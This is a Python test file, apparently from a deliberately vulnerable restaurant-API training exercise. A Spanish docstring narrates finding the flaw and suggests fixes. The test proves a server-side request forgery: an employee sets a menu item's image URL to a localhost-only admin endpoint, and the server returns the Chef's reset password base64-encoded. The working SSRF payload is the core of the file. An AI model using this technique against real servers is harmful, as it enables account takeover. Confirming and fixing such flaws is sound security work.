import base64
import json

from db.models import User, UserRole


def test_ssrf(test_db, employee_client, anon_client, requests_mock, mocker):
    """
    Nota:
        Al usar el rol de empleado, pude acceder a más endpoint
        y encontré más vulnerabilidades en los endpoint restringidos a los empleados.

        Encontré un endpoint PUT "/menu" que permite crear elementos de menú
        y establecer imágenes para estos elementos como empleado.
        No lo creerás, pero es posible establecer una imagen a través de una URL.
        Luego, la imagen se descarga y se almacena en la base de datos en formato
        codificado en base64.
        ¡Podría usar esto para realizar un ataque SSRF!

        También encontré un endpoint oculto "/admin/reset-chef-password"
        que se puede usar para restablecer la contraseña del usuario Chef
        pero solo se puede acceder desde el host local.

        ... ¡y se me ocurrió una idea!

        Puedo usar SSRF en "/menu" que me permitirá realizar solicitudes desde
        el servidor, de modo que pueda acceder al endpoint "/admin/reset-chef-password"
        y obtener la nueva contraseña del usuario Chef.

        Por cierto. La mujer todavía no respondió a mis preguntas relacionadas con
        la API. Este trabajo se ve realmente extraño ahora. Necesito asegurarme
        de que ella es la dueña de este restaurante lo más rápido posible.

        Posible solución:
        Probablemente, se podría solucionar permitiendo que solo se usen los dominios 
        seleccionados para alojar imágenes para el menú. También sería bueno
        restringir los tipos de archivos a solo imágenes.

        Creo que se podría solucionar en "apis/menu/utils.py" en la función "_image_url_to_base64" 
        o en "menu/service.py" en la función "update_menu_item".
    """

    # here, is the test confirming the vulnerability:

    # adding a test Chef user
    chef_user = User(
        username="chef",
        password="password",
        first_name="",
        last_name="",
        phone_number="",
        role=UserRole.CHEF,
    )
    test_db.add(chef_user)
    test_db.commit()

    # for testing purposes I had to mock IP address and requests library response
    mock_client = mocker.patch("fastapi.Request.client")
    mock_client.host = "127.0.0.1"

    def reset_callback(request, context):
        return anon_client.get("/admin/reset-chef-password").json()

    requests_mock.get(
        "http://localhost:8000/admin/reset-chef-password",
        json=reset_callback,
    )

    # here is the main part of the vulnerability proof of concept
    menu_item = {
        "name": "Item",
        "price": 0.00,
        "category": "",
        "description": "",
        "image_url": "http://localhost:8000/admin/reset-chef-password",  # SSRF main part
    }

    response = employee_client.put(f"/menu", content=json.dumps(menu_item))
    assert response.status_code == 201

    # obtaining the base64 encoded result from admin/reset-chef-password endpoint
    base64_reset_result = response.json().get("image_base64")
    reset_result = json.loads(base64.b64decode(base64_reset_result))

    # checking if the password is returned in the base64 encoded response
    # returned password in the response is a proof that the SSRF attack was successful
    assert reset_result.get("password") is not None
